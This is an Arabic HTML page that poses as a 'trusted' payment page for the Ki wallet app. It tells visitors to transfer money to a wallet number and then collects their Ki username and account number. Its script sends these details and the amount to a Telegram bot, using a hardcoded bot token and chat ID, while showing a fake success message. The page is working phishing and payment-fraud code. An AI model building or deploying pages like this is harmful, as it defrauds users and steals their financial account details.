<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.9">
    <title>دفع عبر كي</title>
    <style>
        body {
            font-family: 'Tahoma', sans-serif;
            background-color: #000;
            margin: 0;
            padding: 10px;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-size: 14px;
        }
        .container {
            width: 320px;
            background: #222;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(255,255,255,0.1);
            overflow: hidden;
            border: 1px solid #333;
        }
        .header {
            background: #6c5ce7;
            color: white;
            padding: 12px;
            text-align: center;
            font-size: 16px;
        }
        .step {
            display: none;
            padding: 15px;
        }
        .step.active {
            display: block;
        }
        .ki-logo {
            text-align: center;
            margin: 10px 0;
        }
        .ki-logo img {
            width: 60px;
            height: 60px;
            border-radius: 10px;
            border: 2px solid #6c5ce7;
        }
        .form-group {
            margin-bottom: 12px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 13px;
            color: #ddd;
        }
        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 5px;
            font-size: 13px;
            background: #333;
            color: #fff;
        }
        button {
            background: #6c5ce7;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        button:hover {
            background: #5649c0;
        }
        .instructions {
            background: #333;
            border: 1px dashed #555;
            border-radius: 5px;
            padding: 12px;
            margin: 15px 0;
            font-size: 12px;
        }
        .success-message {
            text-align: center;
            padding: 20px;
            display: none;
        }
        .success-message img {
            width: 70px;
            margin-bottom: 10px;
        }
        .trust-badge {
            font-size: 12px;
            color: #6c5ce7;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>نظام الدفع عبر كي</h1>
        </div>
        
        <!-- الخطوة الأولى -->
        <div id="step1" class="step active">
            <div class="ki-logo">
                <img src="https://play-lh.googleusercontent.com/5yK2h1uLql0JRMmU0hBZnN5yNnqd6k4sxJ1BdPR3wXKcJjlxgR0yW0m5p7X5y9Q5Q=s180-rw" alt="تطبيق كي">
            </div>
            
            <div class="form-group">
                <label for="amount">مبلغ الدفع (ريال)</label>
                <input type="number" id="amount" placeholder="أدخل المبلغ" required>
            </div>
            
            <button onclick="nextStep()">متابعة</button>
            
            <div class="instructions">
                <h3 style="color:#6c5ce7;margin-top:0">تعليمات التحويل:</h3>
                <ol>
                    <li>افتح تطبيق كي</li>
                    <li>اضغط على "تحويل"</li>
                    <li>اختر "إلى رقم محفظة"</li>
                    <li>أدخل الرقم: <strong style="color:#6c5ce7">1234567890</strong></li>
                    <li>أدخل المبلغ</li>
                    <li>اضغط "تحويل الآن"</li>
                </ol>
            </div>
            
            <div class="trust-badge">⏣ نظام دفع موثوق</div>
        </div>
        
        <!-- الخطوة الثانية -->
        <div id="step2" class="step">
            <div class="form-group">
                <label for="username">اسم المستخدم</label>
                <input type="text" id="username" placeholder="اسم المستخدم في كي" required>
            </div>
            
            <div class="form-group">
                <label for="account">رقم الحساب</label>
                <input type="text" id="account" placeholder="رقم الحساب في كي" required>
            </div>
            
            <button onclick="completePayment()">إتمام الطلب</button>
        </div>
        
        <!-- رسالة النجاح -->
        <div id="success" class="success-message">
            <img src="https://cdn-icons-png.flaticon.com/512/7518/7518748.png" alt="نجاح">
            <h2 style="color:#6c5ce7">تم استلام طلبك!</h2>
            <p>سيتم مراجعة الطلب والتواصل معك</p>
            <p style="color:#6c5ce7;font-size:12px">شكراً لثقتك بنا</p>
        </div>
    </div>

    <script>
        function nextStep() {
            const amount = document.getElementById('amount').value;
            if (!amount || amount <= 0) {
                alert('الرجاء إدخال مبلغ صحيح');
                return;
            }
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        }
        
        function completePayment() {
            const username = document.getElementById('username').value;
            const account = document.getElementById('account').value;
            const amount = document.getElementById('amount').value;
            
            if (!username || !account) {
                alert('الرجاء إدخال جميع البيانات');
                return;
            }
            
            // إرسال إلى بوت التليجرام
            sendToTelegram(username, account, amount);
            
            document.getElementById('step2').classList.remove('active');
            document.getElementById('success').style.display = 'block';
        }
        
        function sendToTelegram(username, account, amount) {
            const botToken = '7994988781:AAGledkFlJHCCsLNvaQM3AyVzVRtulPfJDc'; // استبدل بتوكن بوتك
            const chatId = '1697951943'; // استبدل بآيدي الدردشة
            
            const message = `
            💳 *طلب دفع جديد عبر كي*
            ━━━━━━━━━━━━━━
            👤 الاسم: ${username}
            🔢 الحساب: ${account}
            💰 المبلغ: ${amount} ريال
            `;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
    </script>
</body>
</html>
